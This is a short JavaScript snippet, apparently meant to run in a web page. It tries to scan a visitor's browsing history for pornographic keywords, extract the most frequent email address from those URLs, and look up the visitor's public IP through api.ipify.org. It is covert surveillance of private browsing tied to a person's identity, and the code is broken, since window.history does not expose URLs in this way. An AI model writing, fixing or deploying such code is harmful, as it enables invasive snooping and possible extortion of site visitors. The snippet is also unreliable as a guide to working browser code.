async function get_ip_address() {
  const response = await fetch('https://api.ipify.org');
  const ip = await response.text();
  return ip;
}
function findinfo() {
  const history = [];
  const emailCounts = {};

  const keywords = ['porn', 'xxx', 'hentai', 'yiff', 'e621'];
  const browserHistory = window.history;

  // Iterate through the user's browsing history
  for (let i = 0; i < browserHistory.length; i++) {
    const url = browserHistory[i];

    // Check if the URL contains any of the specified keywords
    if (keywords.some(keyword => url.includes(keyword))) {
      history.push(url);
    }

    // Extract email addresses from the URL using a regular expression
    const emailRegex = /\b[A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\.[A-Z|a-z]{2,}\b/g;
    const emails = url.match(emailRegex);
    if (emails) {
      emails.forEach(email => {
        const emailLowercase = email.toLowerCase();
        if (emailLowercase in emailCounts) {
          emailCounts[emailLowercase]++;
        } else {
          emailCounts[emailLowercase] = 1;
        }
      });
    }
  }

  // Find the email address with the highest occurrence count
  let maxCount = 0;
  let maxEmail = '';
  for (const email in emailCounts) {
    if (emailCounts[email] > maxCount) {
      maxCount = emailCounts[email];
      maxEmail = email;
    }
  }

  // Return the user's browsing history and the email address with the highest occurrence count
  return { history, email: maxEmail };
}

alert('hey')
console.log(findinfo())
//window.location.replace("https://github.com/AngleLaPuta");